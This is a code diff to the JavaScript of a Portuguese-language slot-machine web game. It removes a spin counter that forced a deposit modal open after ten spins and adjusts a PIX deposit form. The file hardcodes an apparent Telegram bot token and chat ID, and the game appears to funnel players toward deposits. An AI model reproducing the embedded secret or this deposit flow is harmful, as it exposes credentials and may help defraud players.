@@ -1,13 +1,8 @@
 const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
 const CHAT_ID = "6238676644";
-let contadorGiros = 0;
 
 window.girarSlots = () => {
-    contadorGiros++;
-    if (contadorGiros >= 10) {
-        window.abrirModal();
-        return;
-    }
+    // O bloqueio do contador de giros foi removido
     const colunas = document.querySelectorAll('.coluna');
     const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
     let giros = 0;
@@ -34,11 +29,16 @@ function processarVitoria() {
     setTimeout(() => msg.classList.add('hidden'), 3000);
 }
 
-window.abrirModal = () => document.getElementById('modal-deposito').classList.remove('hidden');
+window.abrirModal = () => {
+    // Reset para garantir que o formulário apareça caso o usuário tenha finalizado um processo anterior
+    document.getElementById('form-deposito').classList.remove('hidden');
+    document.getElementById('info-pix').classList.add('hidden');
+    document.getElementById('modal-titulo').innerText = "Realize seu Depósito";
+    document.getElementById('modal-deposito').classList.remove('hidden');
+};
 
 window.fecharModal = () => {
     document.getElementById('modal-deposito').classList.add('hidden');
-    contadorGiros = 0; // Reseta a contagem ao voltar
 };
 
 window.confirmarDeposito = () => {
@@ -57,10 +57,8 @@ window.confirmarDeposito = () => {
 };
 
 window.copiarChave = () => {
-    // Comando de cópia automática removido para evitar travamento
-    // O usuário agora pode copiar manualmente pressionando o campo da chave
-    alert("Agora você pode copiar a chave manualmente.");
-    window.fecharModal(); // Fecha o modal e volta ao jogo instantaneamente
+    alert("Copie a chave manualmente e volte ao jogo.");
+    window.fecharModal();
 };
 
 window.alterarAposta = (mod) => {
